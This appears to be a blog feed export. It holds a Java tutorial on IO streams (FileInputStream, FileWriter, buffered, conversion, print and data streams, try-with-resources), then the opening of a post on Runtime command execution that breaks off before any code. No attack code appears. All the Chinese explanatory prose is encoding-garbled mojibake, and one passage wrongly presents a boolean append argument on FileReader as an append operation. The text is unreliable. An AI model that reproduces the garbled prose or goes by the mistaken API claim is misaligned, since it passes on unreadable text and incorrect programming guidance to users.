class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç›®æ ‡ï¼šä½¿ç”¨å­—èŠ‚æµè¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;input.jpg&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">//æ–¹å¼1ï¼šä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚è¯»ï¼ˆæ•ˆç‡æä½ï¼Œä¸æ¨èï¼‰</span></span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">while</span> ((b = fis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">        System.out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–¹å¼2ï¼šä½¿ç”¨æ•°ç»„ç¼“å†²è¯»å–ï¼ˆæ¨èï¼Œæ¯”å¦‚ä¸€æ¬¡æ¬è¿1024ä¸ªå­—èŠ‚ï¼‰</span></span><br><span class="line">    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>]; </span><br><span class="line">    <span class="type">int</span> len; <span class="comment">// è®°å½•æ¯æ¬¡å®é™…è¯»å–åˆ°çš„å­—èŠ‚æ•°</span></span><br><span class="line">    <span class="keyword">while</span> ((len = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// å¤„ç†è¯»å–åˆ°çš„æ•°æ®</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(buffer, <span class="number">0</span>, len));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-å­—èŠ‚è¾“å‡ºæµ-OutputStream"><a href="#2-å­—èŠ‚è¾“å‡ºæµ-OutputStream" class="headerlink" title="2.å­—èŠ‚è¾“å‡ºæµ(OutputStream)"></a>2.å­—èŠ‚è¾“å‡ºæµ(OutputStream)</h3><p><strong>å®šä¹‰</strong>ï¼šå®ƒæ˜¯æ‰€æœ‰å­—èŠ‚è¾“å‡ºæµçš„<strong>è¶…ç±»</strong>ã€‚ä»¥å­—èŠ‚ä¸ºå•ä½å†™å‡ºæ•°æ®ã€‚</p><p><strong>æ ¸å¿ƒåœºæ™¯</strong>ï¼šå¤åˆ¶æ–‡ä»¶ã€ä¸‹è½½æ–‡ä»¶ã€å†™å…¥äºŒè¿›åˆ¶æ•°æ®ã€‚</p><p><strong>å¸¸ç”¨å­ç±»</strong>ï¼šFileOutputStream</p><p><strong>æ ¸å¿ƒæ–¹æ³•</strong>ï¼š</p><ul><li><code>void write(int b)</code>: å†™å‡ºä¸€ä¸ªå­—èŠ‚ã€‚</li><li><code>void write(byte[] b)</code>: å†™å‡ºä¸€ä¸ªå­—èŠ‚æ•°ç»„ã€‚</li><li><code>void write(byte[] b, int off, int len)</code>: å†™å‡ºæ•°ç»„çš„ä¸€éƒ¨åˆ†ã€‚</li></ul><p><strong>æ³¨æ„ç‚¹</strong>ï¼š</p><ul><li><strong>è¦†ç›–ä¸è¿½åŠ </strong>ï¼š<code>new FileOutputStream(&quot;a.txt&quot;)</code>é»˜è®¤ä¼šæ¸…ç©ºæ–‡ä»¶é‡æ–°å†™ï¼›<code>new FileOutputStream(&quot;a.txt&quot;, true) </code>åˆ™æ˜¯<strong>è¿½åŠ </strong>æ¨¡å¼ã€‚</li></ul><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// ç›®æ ‡ï¼šå‘æ–‡ä»¶å†™å…¥ &quot;abc&quot;</span><br><span class="line">try (FileOutputStream fos = new FileOutputStream(&quot;output.txt&quot;)) &#123;</span><br><span class="line">    // å†™å…¥å•ä¸ªå­—èŠ‚ &#x27;a&#x27; (ä¹Ÿå°±æ˜¯97)</span><br><span class="line">    fos.write(97);</span><br><span class="line">    </span><br><span class="line">    // å†™å…¥å­—èŠ‚æ•°ç»„</span><br><span class="line">    byte[] bytes = &quot;bc&quot;.getBytes(); // å­—ç¬¦ä¸²è½¬å­—èŠ‚æ•°ç»„</span><br><span class="line">    fos.write(bytes);</span><br><span class="line"></span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-å­—ç¬¦è¾“å…¥æµ-Reader"><a href="#3-å­—ç¬¦è¾“å…¥æµ-Reader" class="headerlink" title="3.å­—ç¬¦è¾“å…¥æµ(Reader)"></a>3.å­—ç¬¦è¾“å…¥æµ(Reader)</h3><p><strong>å®šä¹‰</strong>ï¼šå®ƒæ˜¯æ‰€æœ‰å­—ç¬¦è¾“å…¥æµçš„çˆ¶ç±»ã€‚ä»¥**å­—ç¬¦ï¼ˆCharï¼‰**ä¸ºå•ä½è¯»å–æ•°æ®ã€‚</p><p><strong>ä¸ºä»€ä¹ˆè¦æœ‰å­—ç¬¦æµï¼Ÿ</strong></p><ul><li>ä¸€ä¸ªæ±‰å­—åœ¨ UTF-8 ç¼–ç ä¸‹å  3 ä¸ªå­—èŠ‚ã€‚</li><li>å¦‚æœç”¨å­—èŠ‚æµè¯»ï¼Œä¸€æ¬¡è¯»ä¸€æˆªï¼Œæ±‰å­—ä¼šè¢«æ‹†ç¢ï¼Œå¯¼è‡´<strong>ä¹±ç </strong>ã€‚</li><li>å­—ç¬¦æµä¼šè‡ªåŠ¨å¤„ç†ç¼–ç ï¼Œä¸€æ¬¡è¯»ä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ï¼ˆæ— è®ºå®ƒæ˜¯è‹±æ–‡è¿˜æ˜¯ä¸­æ–‡ï¼‰ã€‚</li></ul><p><strong>å¸¸ç”¨å­ç±»</strong>ï¼šFileReader</p><p><strong>æ ¸å¿ƒæ–¹æ³•</strong>ï¼š</p><ul><li><code>int read()</code>: ä¸€æ¬¡è¯»ä¸€ä¸ªå­—ç¬¦ã€‚</li><li><code>int read(char[] cbuf)</code>: ä¸€æ¬¡è¯»ä¸€ä¸ªå­—ç¬¦æ•°ç»„ã€‚</li></ul><p><code>FileReader fr = new FileReader(&quot;chinese.txt&quot;,true) </code><strong>è¿½åŠ æ“ä½œ</strong></p><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">FileReader</span> <span class="variable">fr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;chinese.txt&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">char</span>[] buffer = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>]; <span class="comment">// è¿™é‡Œæ˜¯ charæ•°ç»„ï¼Œä¸æ˜¯byteæ•°ç»„</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="keyword">while</span> ((len = fr.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// ç›´æ¥æŠŠå­—ç¬¦æ•°ç»„è½¬æˆå­—ç¬¦ä¸²ï¼Œä¸ä¼šä¹±ç </span></span><br><span class="line">        System.out.print(<span class="keyword">new</span> <span class="title class_">String</span>(buffer, <span class="number">0</span>, len));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-å­—ç¬¦è¾“å‡ºæµ-Writer"><a href="#4-å­—ç¬¦è¾“å‡ºæµ-Writer" class="headerlink" title="4.å­—ç¬¦è¾“å‡ºæµ(Writer)"></a>4.å­—ç¬¦è¾“å‡ºæµ(Writer)</h3><p><strong>å®šä¹‰</strong>ï¼šå®ƒæ˜¯æ‰€æœ‰å­—ç¬¦è¾“å‡ºæµçš„çˆ¶ç±»ã€‚</p><p><strong>å¸¸ç”¨å­ç±»</strong>ï¼š<code>FileWriter</code></p><p><strong>æ ¸å¿ƒæ–¹æ³•</strong>ï¼š</p><ul><li><code>void write(int c)</code>: å†™å‡ºä¸€ä¸ªå­—ç¬¦ã€‚</li><li><code>void write(String str)</code>: <strong>ç›´æ¥å†™å‡ºå­—ç¬¦ä¸²</strong>ï¼ˆéå¸¸æ–¹ä¾¿ï¼Œå­—èŠ‚æµåšä¸åˆ°ï¼‰ã€‚</li><li><code>void write(char[] cbuf)</code>: å†™å‡ºå­—ç¬¦æ•°ç»„ã€‚</li></ul><p><strong>é‡è¦ç‰¹æ€§ï¼ˆç¼“å†²åŒºï¼‰</strong>ï¼š<br>Writer å†™å‡ºæ•°æ®æ—¶ï¼Œé€šå¸¸æ˜¯å…ˆå†™åˆ°å†…å­˜çš„ä¸€ä¸ª<strong>ç¼“å†²åŒº</strong>ä¸­ï¼Œå¹¶ä¸ä¼šç«‹åˆ»è½å…¥ç¡¬ç›˜ã€‚<strong>å¦‚æœä¸å…³é—­æµæˆ–è€…ä¸åˆ·æ–°ï¼Œæ•°æ®å¯èƒ½ä¼šä¸¢å¤±ï¼</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">FileWriter</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;text.txt&quot;</span>)) &#123;</span><br><span class="line">    fw.write(<span class="string">&quot;ä½ å¥½ï¼ŒJavaï¼&quot;</span>);</span><br><span class="line">    fw.write(<span class="string">&quot;å¯ä»¥ç›´æ¥å†™å­—ç¬¦ä¸²å¾ˆæ–¹ä¾¿ã€‚&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-æµçš„çŸ¥è¯†ç‚¹"><a href="#5-æµçš„çŸ¥è¯†ç‚¹" class="headerlink" title="5.æµçš„çŸ¥è¯†ç‚¹"></a>5.æµçš„çŸ¥è¯†ç‚¹</h3><ul><li><p><strong>å°†å­—èŠ‚è½¬åŒ–ä¸ºå­—ç¬¦</strong></p><p>è°ƒç”¨ new String(byteæ•°ç»„) æ—¶ï¼ŒJava ä¼šæ‹¿ç€è¿™äº›æ•°å­—ï¼Œå»æŸ¥ä¸€æœ¬â€œå­—å…¸â€ï¼ˆç¼–ç è¡¨ï¼Œé€šå¸¸æ˜¯ UTF-8ï¼‰ã€‚</p><ul><li>Java çœ‹åˆ°æ•°å­— 97 æŸ¥è¡¨ â†’â†’å‘ç°æ˜¯å­—ç¬¦ â€˜aâ€™ã€‚</li><li>Java çœ‹åˆ°è¿ç»­ä¸‰ä¸ªæ•°å­— -28, -67, -96 â†’â†’æŸ¥è¡¨å‘ç°è¿™ä¸‰ä¸ªå‡‘åœ¨ä¸€èµ·æ˜¯æ±‰å­— â€˜ä½ â€™ã€‚</li></ul><p><code>new String(buffer, 0, len)</code>è¿™ä¸ªå¯ä»¥é™å®šå­—ç¬¦è¯»å–ä¸ªæ•°ï¼Œä»è€Œé¿å…<strong>ä¸¥é‡çš„ Bugï¼ˆè„æ•°æ®é—®é¢˜ï¼‰ã€‚</strong></p></li><li><p><strong>åœ¨ FileReaderï¼ˆå­—ç¬¦æµï¼‰ä¸­ï¼š</strong></p><ul><li>æˆ‘ä»¬ç”¨ <code>char[] buffer</code> ä½œä¸ºä¸€ä¸ª**â€œé“²å­â€**ã€‚</li><li><code>read(buffer)</code>ï¼šç”¨é“²å­ä»æ–‡ä»¶é‡Œé“²å‡ºä¸€å †å­—ç¬¦ï¼ˆç å­ï¼‰ã€‚</li><li><code>new String(buffer, 0, len)</code>ï¼šæŠŠé“²å­é‡Œçš„ç å­åŠ å·¥æˆé¡¹é“¾ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œæ–¹ä¾¿ç¨‹åºä½¿ç”¨ã€‚</li></ul></li><li><p><strong>æµçš„åˆ·æ–°</strong></p><ul><li><p><strong>ç¼“å†²æœºåˆ¶</strong>ï¼šä¸ºäº†æé«˜æ•ˆç‡ï¼Œå­—ç¬¦æµå’Œéƒ¨åˆ†ç¼“å†²æµï¼ˆBufferedâ€¦ï¼‰é…å¤‡äº†å†…å­˜ç¼“å†²åŒºã€‚å†™å…¥çš„æ•°æ®ä¼šå…ˆæš‚å­˜åœ¨å†…å­˜é‡Œï¼Œæ”’å¤Ÿäº†ä¸€æ³¢å†å†™ç»™ç¡¬ç›˜ã€‚</p></li><li><p><strong>é—®é¢˜</strong>ï¼šå¦‚æœç¨‹åºçªç„¶ç»“æŸï¼Œç¼“å†²åŒºé‡Œè¿˜å‰©ä¸€ç‚¹æ•°æ®æ²¡æ”’å¤Ÿï¼Œè¿™äº›æ•°æ®å°±ä¸ä¼šå†™å…¥ç¡¬ç›˜ï¼Œå¯¼è‡´<strong>ä¸¢æ•°æ®</strong>ã€‚</p></li></ul><p><strong>æ–¹æ³•</strong>ï¼š<code>flush()</code>å¼ºåˆ¶æŠŠç¼“å†²åŒºçš„æ•°æ®â€œæ¨â€åˆ°ç¡¬ç›˜é‡Œã€‚</p></li><li><p><strong>æµçš„å…³é—­</strong></p><ul><li><p><strong>èµ„æºå ç”¨</strong>ï¼šJava ç¨‹åºé€šè¿‡æ“ä½œç³»ç»Ÿæ¥è¯»å†™æ–‡ä»¶ã€‚æµå¦‚æœä¸å…³é—­ï¼Œè¯¥æ–‡ä»¶å°±ä¼šä¸€ç›´è¢« Java ç¨‹åºå ç”¨ï¼ˆç±»ä¼¼äºä½ æ‰“å¼€ä¸€ä¸ª Word æ–‡æ¡£ä¸å…³ï¼Œåˆ«äººå°±åˆ ä¸æ‰å®ƒï¼‰ã€‚</p></li><li><p><strong>å†…å­˜æ³„éœ²</strong>ï¼šé•¿æœŸçš„èµ„æºä¸é‡Šæ”¾ä¼šå¯¼è‡´å†…å­˜æ³„éœ²ã€‚</p></li></ul><p><strong>æ–¹æ³•</strong>ï¼š<code>close()</code>ï¼Œ<strong>ä»–çš„åº•å±‚ä¹Ÿè°ƒç”¨äº†flush()</strong></p><ul><li><p><strong>æ³¨æ„ï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312314042.png" alt="image-20251216125637767"></p></li></ul></li><li><p><strong>ç›®å‰æµå…³é—­ä¸åˆ·æ–°çš„æœ€ä½³å®è·µ</strong></p><p><code>try-with-resources</code>ä»£ç å—å®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¯­æ³•æ ¼å¼</span></span><br><span class="line"><span class="keyword">try</span> (åˆ›å»ºæµå¯¹è±¡<span class="number">1</span>; åˆ›å»ºæµå¯¹è±¡<span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// è¯»å†™æ“ä½œ</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="comment">// å¼‚å¸¸å¤„ç†</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åªè¦èµ°å‡ºè¿™ä¸ª try å—ï¼ˆæ— è®ºæ˜¯æ­£å¸¸ç»“æŸè¿˜æ˜¯æŠ¥é”™ï¼‰ï¼Œæ‹¬å·é‡Œçš„æµéƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œ close()ã€‚</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="6-ç¼“å†²æµ"><a href="#6-ç¼“å†²æµ" class="headerlink" title="6.ç¼“å†²æµ"></a>6.ç¼“å†²æµ</h3><ul><li><p><strong>åˆ†ç±»</strong></p><p>ç¼“å†²æµå±äº<strong>å¤„ç†æµï¼ˆåŒ…è£…æµï¼‰</strong>ï¼Œå®ƒè‡ªå·±ä¸èƒ½ç›´æ¥è¿æ–‡ä»¶ï¼Œå¿…é¡»<strong>åŒ…è£¹</strong>åœ¨ç°æœ‰çš„èŠ‚ç‚¹æµï¼ˆå¦‚ FileInputStreamï¼‰ä¹‹ä¸Šã€‚</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312317080.png" alt="image-20251216215505783"></p><ul><li><p><strong>å­—èŠ‚è¾“å‡ºä¸è¾“å…¥æµåˆ©ç”¨</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">srcFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;video.mp4&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">destFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;video_copy.mp4&quot;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// ä½¿ç”¨ try-with-resources è¯­æ³•ï¼Œè‡ªåŠ¨å…³é—­æµ</span></span><br><span class="line"><span class="keyword">try</span> (</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºåŸºæœ¬æµ</span></span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(srcFile);</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(destFile);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. åˆ›å»ºç¼“å†²æµï¼ŒæŠŠåŸºæœ¬æµ&quot;åŒ…&quot;èµ·æ¥</span></span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fis);</span><br><span class="line">    <span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(fos);</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="comment">// 3. è¯»å†™æ“ä½œ</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>]; <span class="comment">// è¿™é‡Œè¿˜æ˜¯å¯ä»¥ç”¨ä¸€ä¸ªå­—èŠ‚æ•°ç»„ä½œä¸ºä¸­é—´æ¡¥æ¢</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ä» bis è¯»ï¼Œè™½ç„¶çœ‹èµ·æ¥å’Œæ™®é€šæµä¸€æ ·ï¼Œä½†å…¶å®å®ƒåº•å±‚å·²ç»åœ¨å¸®ä½ æ‰¹é‡é¢„è¯»äº†</span></span><br><span class="line">    <span class="keyword">while</span> ((len = bis.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        bos.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    System.out.println(<span class="string">&quot;å¤åˆ¶å®Œæˆï¼&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><p><strong>å­—ç¬¦ç¼“å†²æµ (ç”¨äºå¤„ç†æ–‡æœ¬)</strong></p><p>æ—¥å¸¸å¼€å‘å¤„ç†æ–‡æœ¬ï¼ˆtxt, json, configç­‰ï¼‰<strong>æœ€å¸¸ç”¨</strong>çš„æ–¹å¼ï¼Œå› ä¸ºå®ƒä»¬æœ‰ä¸¤ä¸ª<strong>è¶…çº§å¥½ç”¨</strong>çš„ç‰¹æœ‰æ–¹æ³•ã€‚</p><ol><li><strong>BufferedReader ç‰¹æœ‰æ–¹æ³•ï¼šreadLine()</strong><ul><li>ä¸€æ¬¡è¯»å–ä¸€è¡Œæ–‡æœ¬ã€‚</li><li>è¯»ä¸åˆ°æ—¶è¿”å› nullï¼ˆè€Œä¸æ˜¯ -1ï¼‰ã€‚</li></ul></li><li><strong>BufferedWriter ç‰¹æœ‰æ–¹æ³•ï¼šnewLine()</strong><ul><li>è‡ªåŠ¨å†™å…¥ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚</li><li>å¥½å¤„ï¼šå®ƒæ˜¯è·¨å¹³å°çš„ï¼ˆWindowsæ˜¯ \r\nï¼ŒLinuxæ˜¯ \nï¼‰ï¼Œå®ƒä¼šè‡ªåŠ¨æ ¹æ®ç³»ç»Ÿè¯†åˆ«ã€‚</li></ul></li></ol><p><strong>ç¼“å­˜æµï¼šå†…ç½®äº†ç¼“å†²åŒºï¼ˆ8KBï¼‰ï¼Œæå¤§å‡å°‘äº†è¯»å†™ç¡¬ç›˜çš„æ¬¡æ•°ï¼Œé€Ÿåº¦æ¯”æ™®é€šæµå¿«å¾ˆå¤š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312314865.png" alt="image-20251216220705155"></p><p><strong>ä½†æ˜¯éç¼“å†²æµä¹Ÿå¯ä»¥å°†æ•°ç»„å†™å¾ˆå¤§ä»¥è¾¾åˆ°ç¼“å†²æµçš„æ•ˆæœ</strong></p><h3 id="7-å…¶ä»–é«˜çº§æµ"><a href="#7-å…¶ä»–é«˜çº§æµ" class="headerlink" title="7.å…¶ä»–é«˜çº§æµ"></a>7.å…¶ä»–é«˜çº§æµ</h3><h4 id="è½¬æ¢æµ"><a href="#è½¬æ¢æµ" class="headerlink" title="è½¬æ¢æµ"></a>è½¬æ¢æµ</h4><p><strong>æ ¸å¿ƒç»„ä»¶ï¼š</strong></p><ul><li><code>InputStreamReader</code>ï¼šå­—èŠ‚æµé€šå‘å­—ç¬¦æµçš„æ¡¥æ¢ã€‚</li><li><code>OutputStreamWriter</code>ï¼šå­—ç¬¦æµé€šå‘å­—èŠ‚æµçš„æ¡¥æ¢ã€‚</li></ul><p><code>InputStreamReader isr = new InputStreamReader(fis, &quot;GBK&quot;);</code>å°±æ˜¯å°†æ™®é€šå­—èŠ‚æµåŒ…è£…ï¼Œå¹¶å°†å…¶ä»¥è§„å®šç¼–ç æ–¹å¼è¯»å–ï¼</p><h4 id="æ‰“å°æµ"><a href="#æ‰“å°æµ" class="headerlink" title="æ‰“å°æµ"></a>æ‰“å°æµ</h4><p><strong>æ ¸å¿ƒç»„ä»¶ï¼š</strong></p><ul><li><code>PrintStreamï¼ˆå­—èŠ‚æ‰“å°æµï¼‰</code>ï¼šSystem.out å°±æ˜¯è¿™ä¸ªç±»å‹ã€‚</li><li><code>PrintWriterï¼ˆå­—ç¬¦æ‰“å°æµï¼‰</code>ï¼šWeb å¼€å‘ä¸­å¸¸ç”¨ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="string">&quot;print.txt&quot;</span>);</span><br><span class="line">pw.println(<span class="string">&quot;ä½ å¥½&quot;</span>);</span><br><span class="line">pw.println(<span class="number">97</span>); <span class="comment">// æ–‡ä»¶ä¸­æ˜¾ç¤º 97ï¼Œè€Œä¸æ˜¯ &#x27;a&#x27;</span></span><br><span class="line">pw.println(<span class="literal">true</span>);</span><br><span class="line">pw.close();</span><br></pre></td></tr></table></figure><p>æ™®é€šæµå†™æ•´æ•° 97ï¼Œä¼šå†™å‡ºå­—ç¬¦ â€˜aâ€™ï¼ˆå› ä¸º 97 æ˜¯ â€˜aâ€™ çš„ ASCII ç ï¼‰ã€‚ä½†æ‰“å°æµå†™ 97ï¼Œæ–‡ä»¶é‡Œå°±æ˜¯ â€œ97â€ã€‚å®ƒæä¾›äº† print() å’Œ println() æ–¹æ³•</p><h4 id="æ•°æ®æµ"><a href="#æ•°æ®æµ" class="headerlink" title="æ•°æ®æµ"></a>æ•°æ®æµ</h4><p><strong>æ ¸å¿ƒç»„ä»¶ï¼š</strong></p><ul><li><code>DataInputStream</code></li><li><code>DataOutputStream</code></li></ul><p>æŠŠä¸€ä¸ª int ç±»å‹çš„æ•°å­—ã€ä¸€ä¸ª double ç±»å‹çš„æµ®ç‚¹æ•°ã€æˆ–è€…ä¸€ä¸ª boolean å€¼å†™å…¥æ–‡ä»¶ï¼Œå¹¶ä¸”<strong>ä»¥åè¯»å‡ºæ¥çš„æ—¶å€™ï¼Œè¿˜èƒ½ç›´æ¥è¢«è¯†åˆ«ä¸º int, double, boolean</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å†™</span></span><br><span class="line"><span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;data.bin&quot;</span>));</span><br><span class="line">dos.writeInt(<span class="number">123</span>);</span><br><span class="line">dos.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">dos.writeDouble(<span class="number">3.14</span>);</span><br><span class="line">dos.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯» </span></span><br><span class="line"><span class="type">DataInputStream</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;data.bin&quot;</span>));</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> dis.readInt();</span><br><span class="line"><span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> dis.readBoolean();</span><br><span class="line"><span class="type">double</span> <span class="variable">c</span> <span class="operator">=</span> dis.readDouble();</span><br><span class="line"><span class="comment">// è¾“å‡ºï¼š123, true, 3.14</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-å¸¸è§å±é™©ç±»</title>
      <link href="/2025/12/13/runtime/"/>
      <url>/2025/12/13/runtime/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå®‰å…¨-å±é™©ç±»"><a href="#javaå®‰å…¨-å±é™©ç±»" class="headerlink" title="javaå®‰å…¨-å±é™©ç±»"></a>javaå®‰å…¨-å±é™©ç±»</h1><h2 id="ä¸€ã€Runtimeå‘½ä»¤æ‰§è¡Œ"><a href="#ä¸€ã€Runtimeå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ä¸€ã€Runtimeå‘½ä»¤æ‰§è¡Œ"></a>ä¸€ã€Runtimeå‘½ä»¤æ‰§è¡Œ</h2><h3 id="1-Runtimeç±»"><a href="#1-Runtimeç±»" class="headerlink" title="1.Runtimeç±»"></a>1.Runtimeç±»</h3><ul><li><code>Runtime</code> æ˜¯ <strong>JDK è‡ªå¸¦ã€ä½äº java.lang åŒ…ä¸­çš„ç±»</strong>ï¼Œæ¯ä¸ª JVM è¿›ç¨‹å†…éƒ¨åªæœ‰ä¸€ä¸ª Runtime å®ä¾‹ã€‚</li></ul><p>æ­£å¸¸è°ƒç”¨è®¡ç®—æœºæ–¹å¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span 